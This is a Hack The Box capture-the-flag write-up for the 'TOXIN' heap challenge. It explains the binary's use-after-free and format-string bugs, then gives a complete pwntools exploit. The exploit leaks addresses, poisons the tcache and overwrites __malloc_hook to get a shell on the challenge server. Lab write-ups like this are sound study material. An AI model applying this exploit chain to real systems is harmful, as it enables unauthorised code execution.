<div align="left">

<img src="https://img.shields.io/badge/FuzzRaiders_Team_Member-0a66ff?style=flat-square&logo=github" />
<img src="https://img.shields.io/badge/Sub_Zero-0f172a?style=flat-square" />
<img src="https://img.shields.io/badge/🎯%20Role-Exploit_Dev-1e293b?style=flat-square" />
<img src="https://img.shields.io/badge/📜%20Certification-CEDP_(CyberWarFare_Labs)-334155?style=flat-square" />
<img src="https://img.shields.io/badge/🟢%20Status-In_Progress-16a34a?style=flat-square" />

</div>

# Hack The Box - TOXIN

![Category: Binary Exploitation](https://img.shields.io/badge/Category-Pwn-red)<br>
![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-blue)<br>
![Platform: Hack%20The%20Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)




---

## 📌 Challenge Overview

> Heap exploitation challenge using format string leaks, tcache poisoning, and libc hook overwrite (libc 2.27).

---

## 🛠️ Tools Used

The following tools were used throughout the analysis and exploitation process:
```
pwninit      >     Patch the binary to use the provided libc and dynamic loader
pwntools     >     Exploit development framework (remote interaction, ELF parsing)
Ghidra       >     Static analysis and reverse engineering
checksec     >     Identify enabled binary protections
```
---

## ⚙️ Provided Files

* `toxin` (ELF binary)
* `libc.so.6` (remote libc)
* `ld-linux-x86-64.so.2` (dynamic loader)

> The binary was patched using **pwninit** to ensure it loads the provided libc and loader.

##  Vulnerability Analysis

##  Security Mitigations

```text
RELRO    Full
Canary   No
NX       Yes
PIE      Yes
```


![checksec output](images/checksec.png)

---

## 🔎 Reverse Engineering

Reverse engineering was performed using **Ghidra**.

### Main Menu

The program exposes a simple menu:

1. Add a toxin
2. Edit a toxin
3. Drink a toxin
4. Search for a toxin



![main function pseudocode](images/main-func.png)

---


### 1️⃣ Add Toxin

* Allocates a heap chunk (max 224 bytes)
* Stores pointers in `.bss`
* Maximum of **3 active toxins**



![add toxin pseudocode](images/add-fucn.png)

---

### 2️⃣ Edit Toxin — Use-After-Free

* Allows editing a toxin **without checking if it was freed**
* Enables writing into **tcache freed chunks**

**Impact:** Tcache poisoning


![edit toxin pseudocode](images/edit-func.png)

---

### 3️⃣ Drink Toxin — One-Time Free

* Only one free allowed per execution
* Enforced via `toxinfreed` flag in `.bss`



![drink toxin pseudocode](images/drink-func.png)

---

### 4️⃣ Search Toxin — Format String Vulnerability

* User input passed directly to `printf`
* Allows leaking stack, libc, and PIE addresses


![search toxin pseudocode](images/search-func.png)

---

##  Exploitation Strategy

## 🧨 Exploit Code

```python
from pwn import *
import time

context.binary = elf = ELF("./toxin")
libc = ELF("./lib/libc.so.6")

p = remote("83.136.252.32", 40966)
time.sleep(0.5)

# ===== FORMAT STRING LEAK =====
def fs_vuln(pos):
    p.recv(timeout=1)
    p.sendline(b"4")
    p.recvuntil(b"Time", timeout=2)

    payload = f"%{pos}$p".encode()
    p.sendline(payload)

    while True:
        line = p.recvline(timeout=2)
        if not line:
            break
        if b"0x" in line:
            leak = b"0x" + line.split(b"0x")[1].split()[0]
            return int(leak, 16)
    return None

# ===== MENU HELPERS =====
def add_toxin(size, idx, data):
    p.sendline(b"1")
    p.recv()
    p.sendline(str(size).encode())
    p.recv()
    p.sendline(str(idx).encode())
    p.recv()
    p.send(data)
    p.recv()

def edit_toxin(idx, data):
    p.sendline(b"2")
    p.recv()
    p.sendline(str(idx).encode())
    p.recv()
    p.send(data)
    p.recv()

def drink_toxin(idx):
    p.sendline(b"3")
    p.recv()
    p.sendline(str(idx).encode())
    p.recv()

# ===== LEAKS =====
libc_leak = fs_vuln(3)
elf_leak  = fs_vuln(9)

libc_base = libc_leak - 0x110081
elf_base  = elf_leak  - 0x1284

# ===== HEAP EXPLOIT =====
add_toxin(100, 0, b"A"*8)
drink_toxin(0)

target = elf_base + elf.symbols["toxinfreed"] - 0x13
edit_toxin(0, p64(target))

add_toxin(100, 1, b"B"*8)
add_toxin(
    100,
    2,
    b"\x00"*35 +
    p64(libc_base + libc.symbols["__malloc_hook"]) +
    p64(0)*3
)

# overwrite malloc hook
edit_toxin(0, p64(libc_base + 0x10a38c))

# trigger
p.sendline(b"1")
p.sendline(b"1")
p.sendline(b"1")

p.interactive()
```

### Phase 1 — Information Disclosure

* Use format string to leak:

  * libc address
  * PIE base

### Phase 2 — Tcache Poisoning

* Free one chunk
* Overwrite `fd` pointer using UAF
* Redirect allocation to controlled target

### Phase 3 — Code Execution

* Overwrite `__malloc_hook` with one_gadget
* Trigger `malloc`
* Get shell

**Heap Layout Placeholder:**

![heap layout](images/exploit-found%20flag.png)

---

---

🧠 What This Challenge Teaches (Short)

* PIE makes information disclosure mandatory — exploitation starts with leaks, not crashes.
* A single Use‑After‑Free is enough when allocator behavior is understood.
* Tcache poisoning (glibc 2.27) allows full control of future allocations.
* Full RELRO protects the GOT, not libc hooks or heap metadata.
* Modern exploitation is about chaining primitives, not abusing one bug.
* Limited primitives force precision and planning, not brute force.

## 📌 Conclusion

This challenge combines classic **libc 2.27 heap exploitation primitives**:
>_Despite the one-free restriction, the vulnerabilities chain cleanly into reliable code execution._
 *Format string information disclosure
* Use-after-free
* Tcache poisoning
* `__malloc_hook` overwrite



This work is part of FuzzRaiders’ structured hands-on training and research program, where every lab, project, and technical study is formally documented, reviewed, and validated to ensure real-world applicability, methodological rigor and real-world security execution.

Happy hacking 🚀

## Author: SUB-ZERO

## [LinkedIn:](https://www.linkedin.com/in/salman-hussein-3615852a4/)

